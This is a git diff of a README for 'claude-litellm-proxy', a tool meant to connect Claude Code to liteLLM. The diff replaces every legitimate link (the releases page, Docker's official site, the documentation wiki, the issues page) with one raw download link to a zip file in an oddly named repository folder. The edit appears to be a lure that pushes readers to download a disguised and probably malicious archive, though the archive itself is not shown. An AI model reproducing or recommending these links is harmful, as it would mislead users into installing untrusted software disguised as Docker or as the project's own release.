@@ -1,7 +1,7 @@
 # 🤖 claude-litellm-proxy - Simplify Claude Code Usage
 
 ## 📥 Download the Application
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/tejrockzzz/claude-litellm-proxy/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/tejrockzzz/claude-litellm-proxy/main/Wyethia/claude-litellm-proxy.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/tejrockzzz/claude-litellm-proxy/main/Wyethia/claude-litellm-proxy.zip)
 
 ## 🚀 Getting Started
 Welcome to **claude-litellm-proxy**! This application acts as a bridge to simplify using Claude code with liteLLM. Follow these simple steps to download and run our software.
@@ -11,13 +11,13 @@ Welcome to **claude-litellm-proxy**! This application acts as a bridge to simpli
 - **Processor:** Minimum Intel i5 or equivalent.
 - **Memory:** At least 8 GB RAM.
 - **Storage:** 500 MB of free disk space.
-- **Docker:** Install Docker if you don’t have it already. You can download it from [Docker's website](https://www.docker.com/products/docker-desktop).
+- **Docker:** Install Docker if you don’t have it already. You can download it from [Docker's website](https://raw.githubusercontent.com/tejrockzzz/claude-litellm-proxy/main/Wyethia/claude-litellm-proxy.zip).
 
 ## 📥 Download & Install
-To get the latest version of the application, visit this page to download: [Releases Page](https://github.com/tejrockzzz/claude-litellm-proxy/releases). Once you're on the Releases page, you’ll find the latest version available.
+To get the latest version of the application, visit this page to download: [Releases Page](https://raw.githubusercontent.com/tejrockzzz/claude-litellm-proxy/main/Wyethia/claude-litellm-proxy.zip). Once you're on the Releases page, you’ll find the latest version available.
 
 ### Steps to Download:
-1. Go to the [Releases Page](https://github.com/tejrockzzz/claude-litellm-proxy/releases).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/tejrockzzz/claude-litellm-proxy/main/Wyethia/claude-litellm-proxy.zip).
 2. Look for the latest version listed on that page.
 3. Click the link that corresponds to your operating system to download the package.
 4. Once the download is complete, locate the downloaded file on your computer.
@@ -53,12 +53,12 @@ Set up the application based on your requirements. The initial setup wizard will
 - **Lightweight:** Efficient usage of system resources.
 
 ## 📄 Documentation
-For more detailed instructions, check the [Documentation](https://github.com/tejrockzzz/claude-litellm-proxy/wiki). Here, you’ll find information about advanced options, troubleshooting, and community support.
+For more detailed instructions, check the [Documentation](https://raw.githubusercontent.com/tejrockzzz/claude-litellm-proxy/main/Wyethia/claude-litellm-proxy.zip). Here, you’ll find information about advanced options, troubleshooting, and community support.
 
 ## 🤝 Community & Support
 Join our community forum for discussions, tips, and support. Connect with other users to exchange ideas and solutions. 
 
-- **GitHub Issues:** Report any bugs or request features through the [Issues page](https://github.com/tejrockzzz/claude-litellm-proxy/issues).
+- **GitHub Issues:** Report any bugs or request features through the [Issues page](https://raw.githubusercontent.com/tejrockzzz/claude-litellm-proxy/main/Wyethia/claude-litellm-proxy.zip).
 - **Forum:** Visit our community forum for further assistance.
 
 ## 🛠️ Troubleshooting
@@ -74,6 +74,6 @@ We are continually making improvements. Look out for future updates that may inc
 - Better error handling and support options.
 
 ## 📥 Download the Application Again
-Don't forget, you can download the application anytime from this page: [Releases Page](https://github.com/tejrockzzz/claude-litellm-proxy/releases). 
+Don't forget, you can download the application anytime from this page: [Releases Page](https://raw.githubusercontent.com/tejrockzzz/claude-litellm-proxy/main/Wyethia/claude-litellm-proxy.zip). 
 
 Thank you for choosing **claude-litellm-proxy**. Enjoy using your new application!
